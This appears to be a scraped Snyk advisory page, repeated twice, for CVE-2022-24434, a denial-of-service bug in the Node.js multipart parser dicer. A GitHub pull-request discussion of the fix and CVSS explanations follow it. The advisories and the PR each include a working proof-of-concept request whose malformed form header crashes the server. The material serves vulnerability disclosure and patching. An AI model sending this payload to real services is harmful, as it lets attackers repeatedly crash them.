#### Introduced: 7 Dec 2021

[CVE-2022-24434  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2022-24434) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-400  (opens in a new tab)](https://cwe.mitre.org/data/definitions/400.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses
## How to fix?

There is no fixed version for `org.webjars.npm:dicer`.

## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS). A malicious attacker can send a modified form to server, and crash the nodejs service. An attacker could sent the payload again and again so that the service continuously crashes.

## PoC

await fetch('<http://127.0.0.1:8000>', {
method: 'POST',
headers: {
['content-type']: 'multipart/form-data; boundary=----WebKitFormBoundaryoo6vortfDzBsDiro',
['content-length']: '145',
connection: 'keep-alive',
},
body: '------WebKitFormBoundaryoo6vortfDzBsDiro\r\n Content-Disposition: form-data; name="bildbeschreibung"\r\n\r\n\r\n------WebKitFormBoundaryoo6vortfDzBsDiro--'
});

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

  **High**

#### Introduced: 7 Dec 2021

[CVE-2022-24434  (opens in a new tab)](https://www.cve.org/CVERecord?id=CVE-2022-24434) Common Vulnerabilities and Exposures (CVE) are common identifiers for publicly known security vulnerabilities[CWE-400  (opens in a new tab)](https://cwe.mitre.org/data/definitions/400.html) Common Weakness Enumeration (CWE) is a category system for software weaknesses First added by Snyk
## How to fix?

There is no fixed version for `dicer`.

## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS). A malicious attacker can send a modified form to server, and crash the nodejs service. An attacker could sent the payload again and again so that the service continuously crashes.

## PoC

await fetch('<http://127.0.0.1:8000>', {
method: 'POST',
headers: {
['content-type']: 'multipart/form-data; boundary=----WebKitFormBoundaryoo6vortfDzBsDiro',
['content-length']: '145',
connection: 'keep-alive',
},
body: '------WebKitFormBoundaryoo6vortfDzBsDiro\r\n Content-Disposition: form-data; name="bildbeschreibung"\r\n\r\n\r\n------WebKitFormBoundaryoo6vortfDzBsDiro--'
});

### CVSS Scores

version 3.1
### Snyk

7.5 high

* Attack Vector (AV)

  The vulnerable component is bound to the network stack and the set of possible attackers extends beyond the other options listed below, up to and including the entire Internet. Such a vulnerability is often termed “remotely exploitable” and can be thought of as an attack being exploitable *at the protocol level* one or more network hops away (e.g., across one or more routers).

  **Network**
* Attack Complexity (AC)

  Specialized access conditions or extenuating circumstances do not exist. An attacker can expect repeatable success when attacking the vulnerable component.

  **Low**
* Privileges Required (PR)

  The attacker is unauthorized prior to attack, and therefore does not require any access to settings or files of the vulnerable system to carry out an attack.

  **None**
* User Interaction (UI)

  The vulnerable system can be exploited without interaction from any user.

  **None**

* Scope (S)

  An exploited vulnerability can only affect resources managed by the same security authority. In this case, the vulnerable component and the impacted component are either the same, or both are managed by the same security authority.

  **Unchanged**

* Confidentiality (C)

  There is no loss of confidentiality within the impacted component.

  **None**
* Integrity (I)

  There is no loss of integrity within the impacted component.

  **None**
* Availability (A)

  There is a total loss of availability, resulting in the attacker being able to fully deny access to resources in the impacted component; this loss is either sustained (while the attacker continues to deliver the attack) or persistent (the condition persists even after the attack has completed). Alternatively, the attacker has the ability to deny some availability, but the loss of availability presents a direct, serious consequence to the impacted component (e.g., the attacker cannot disrupt existing connections, but can prevent new connections; the attacker can repeatedly exploit a vulnerability that, in each instance of a successful attack, leaks a only small amount of memory, but after repeated exploitation causes a service to become completely unavailable).

### @RolandHeinze **[RolandHeinze](/RolandHeinze)** commented [Aug 5, 2021](#issue-962078210)

Function `HeaderParser.prototype._parseHeader()` uses a variable `h`, which in edge cases is used before it is initialized. As a consequence the statement

```
this.header[h][this.header[h].length - 1] += lines[i];
```

would crash. This can happen if an attacker uses a manipulated multipart/form-data header with a header name that starts with ' ' or '\t'. I wrote a simple HTML file that is exactly doing this using the fetch() function:

```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
</head>

<body onload="sectest()">
<button id="security">Security Check</button>
<script>
  function sectest() {
    const button_sectest = document.getElementById('security');
    button_sectest.onclick = send;
  }
  function send(event) {
    event.preventDefault();
    fetch('form-image', {
      method: 'POST',
      headers: {
        ['content-type']: 'multipart/form-data; boundary=----WebKitFormBoundaryoo6vortfDzBsDiro',
        ['content-length']: '145',
        host: '127.0.0.1:8000',
        connection: 'keep-alive',
      },
      body: '------WebKitFormBoundaryoo6vortfDzBsDiro\r\n Content-Disposition: form-data; name="bildbeschreibung"\r\n\r\n\r\n------WebKitFormBoundaryoo6vortfDzBsDiro--'
    });
  }
</script>
</body>
</html>
```

I used such an HTML file, and was able to crash Dicer and also Busboy. In particular, it happens if one uses the example server code presented on the Dicer GitHub repository. I think that it is a severe bug which should be removed as soon as possible.

Therefore, I wrote this PR. It

* removes the mentioned bug;
* removes a bug in the HeaderParser constructor functions which computed a wrong value for the variable `end`;
* removes some unnecessary code in `HeaderParser.prototype._parseHeader()`;
* removes the variable `_realFinish` and all of it's occurances in `Dicer.js` as it is not necessary, increases the code size, and adds unwanted complexity;
* removes an unnecessary `else if`clause in the function `Dicer.prototype._oninfo()`;

Sorry, something went wrong.

| [@RolandHeinze](https://github.com/RolandHeinze) Are you using dicer as a part of busboy or separately? Context for the question - we have forked busboy within fastify organization in order to restart development on it, and our original plan was to just embed dicer in it. However, if there is demand for fixed dicer outside of busboy, we can also provide that as a separate dependency. |

| [@nathan-gilbert](https://github.com/nathan-gilbert) If you're just parsing web forms (multipart or urlencoded), `busboy` would be a better choice.  `dicer` was originally created for use by `busboy`, but it no longer depends on it. |

| [@mscdex](https://github.com/mscdex) I'm not using `dicer` directly, but many of my dependencies are so it would be a much larger refactor than simply switching `dicer` for `busboy`. |

| [@nathan-gilbert](https://github.com/nathan-gilbert) If the parent dependency is an older version of `busboy`, releasing a new version of `dicer` would not help as those old versions of `busboy` used exact versions for the `dicer` dependency and not version ranges. |

| [@mscdex](https://github.com/mscdex) Yep, you're right. I thought there were more than just `busboy` using `dicer` but it doesn't look like it. I think all I need to do is upgrade `busboy`.  Thanks, sorry for taking up some time here. |

| There is a Denial of Service (DoS) security flaw has been introduced in multer@1.4.4. The details are available in the Snyk report: <https://security.snyk.io/vuln/SNYK-JS-DICER-2311764> There is no fix version available. So It is impacting other modules which dependent on the multer module. So we are looking for fix version for this as soon as possible. |

| multer just needs to upgrade to the latest version of busboy. For existing multer installations, there's nothing that can be done (see [#22 (comment)](https://github.com/mscdex/dicer/pull/22#issuecomment-1133276609)).  This is not as easy as said, since the change in to not use dice is part of the braking release v1.0.0, which drops the support of older node versions. Upgrading to this version in multer would also require multer to create a breaking change release. (See: [expressjs/multer#1097](https://github.com/expressjs/multer/pull/1097))  Creating a fix in dicer would enable different users to use the `override` feature of npm to quick-fix the issue.  Also: if you don't plan to support dicer further, i think it would be beneficial to deprecate/archive this repo and add some infos, that users can find easily. |

| We also have a direct dependency on `dicer` in firebase-admin-node. Fixing `dicer` would help developers who are currently have their releases blocked on `npm audit` (see [firebase/firebase-admin-node#1718 (comment)](https://github.com/firebase/firebase-admin-node/issues/1718#issuecomment-1139958102)). It will also provide a stopgap solution for package maintainers and buy some time to implement a proper fix (updating busboy etc.).  Also agree with [@rudxde](https://github.com/rudxde) if you no longer recommend developers to use `dicer` directly, deprecating the module would help. |

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
